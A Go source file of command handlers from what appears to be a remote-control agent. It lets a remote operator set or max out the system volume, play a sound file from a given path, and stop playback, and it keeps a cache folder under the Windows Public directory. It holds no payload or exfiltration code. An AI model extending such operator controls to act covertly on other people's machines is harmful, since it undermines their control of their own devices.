package handlers

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"math"
	"os"
	"path/filepath"
	"strings"

	"overlord-client/cmd/agent/runtime"
)

const (
	soundboardCacheDirName = "Overlord\\soundboard"
	maxSoundPathLen        = 512
)

func handleSystemVolume(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	goSafe("system_volume", env.Cancel, func() {
		level, hasLevel, err := parseOptionalVolumeLevel(payload)
		if err != nil {
			sendCommandResultSafe(env, cmdID, false, err.Error())
			return
		}
		if hasLevel {
			if err := setSystemVolumeNative(level); err != nil {
				sendCommandResultSafe(env, cmdID, false, err.Error())
				return
			}
		}
		current, muted, err := getSystemVolumeNative()
		if err != nil {
			sendCommandResultSafe(env, cmdID, false, err.Error())
			return
		}
		msg := fmt.Sprintf("level=%d muted=%t", current, muted)
		sendCommandResultSafe(env, cmdID, true, msg)
	})
	return nil
}

func handlePlaySound(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	pathRaw, _ := payload["path"].(string)
	pathRaw = strings.TrimSpace(pathRaw)
	if pathRaw == "" {
		sendCommandResultSafe(env, cmdID, false, "path is required")
		return nil
	}
	if len(pathRaw) > maxSoundPathLen {
		sendCommandResultSafe(env, cmdID, false, "path is too long")
		return nil
	}
	wantSHA, _ := payload["sha256"].(string)
	wantSHA = strings.TrimSpace(wantSHA)
	goSafe("play_sound", env.Cancel, func() {
		if !soundCachePathMatches(pathRaw, wantSHA) {
			if wantSHA != "" {
				sendCommandResultSafe(env, cmdID, false, "sound file not found or hash mismatch")
			} else {
				sendCommandResultSafe(env, cmdID, false, "sound file not found")
			}
			return
		}
		if err := playSoundNative(pathRaw); err != nil {
			sendCommandResultSafe(env, cmdID, false, err.Error())
			return
		}
		sendCommandResultSafe(env, cmdID, true, "playing")
	})
	return nil
}

func handleStopSound(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	_ = payload
	goSafe("stop_sound", env.Cancel, func() {
		if err := stopSoundNative(); err != nil {
			sendCommandResultSafe(env, cmdID, false, err.Error())
			return
		}
		sendCommandResultSafe(env, cmdID, true, "stopped")
	})
	return nil
}

func parseOptionalVolumeLevel(payload map[string]interface{}) (int, bool, error) {
	if payload == nil {
		return 0, false, nil
	}
	raw, ok := payload["level"]
	if !ok || raw == nil {
		if maxRaw, hasMax := payload["max"]; hasMax {
			switch v := maxRaw.(type) {
			case bool:
				if v {
					return 100, true, nil
				}
			case string:
				if strings.EqualFold(strings.TrimSpace(v), "true") || strings.TrimSpace(v) == "1" {
					return 100, true, nil
				}
			case float64:
				if v != 0 {
					return 100, true, nil
				}
			}
		}
		return 0, false, nil
	}
	n, err := coerceFloat(raw)
	if err != nil {
		return 0, false, fmt.Errorf("level must be 0-100")
	}
	if math.IsNaN(n) || math.IsInf(n, 0) {
		return 0, false, fmt.Errorf("level must be 0-100")
	}
	level := int(math.Round(n))
	if level < 0 || level > 100 {
		return 0, false, fmt.Errorf("level must be 0-100")
	}
	return level, true, nil
}

func coerceFloat(raw interface{}) (float64, error) {
	switch v := raw.(type) {
	case float64:
		return v, nil
	case float32:
		return float64(v), nil
	case int:
		return float64(v), nil
	case int32:
		return float64(v), nil
	case int64:
		return float64(v), nil
	case uint:
		return float64(v), nil
	case uint32:
		return float64(v), nil
	case uint64:
		return float64(v), nil
	case string:
		trimmed := strings.TrimSpace(v)
		if trimmed == "" {
			return 0, fmt.Errorf("empty")
		}
		var parsed float64
		if _, err := fmt.Sscanf(trimmed, "%f", &parsed); err != nil {
			return 0, err
		}
		return parsed, nil
	default:
		return 0, fmt.Errorf("unsupported")
	}
}

func soundboardCacheDir() (string, error) {
	public := os.Getenv("PUBLIC")
	if public == "" {
		public = `C:\Users\Public`
	}
	dir := filepath.Join(public, soundboardCacheDirName)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	return dir, nil
}

func fileSHA256Hex(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

func soundCachePathMatches(path, wantSHA string) bool {
	wantSHA = strings.ToLower(strings.TrimSpace(wantSHA))
	if wantSHA == "" {
		info, err := os.Stat(path)
		return err == nil && !info.IsDir()
	}
	got, err := fileSHA256Hex(path)
	if err != nil {
		return false
	}
	return strings.EqualFold(got, wantSHA)
}
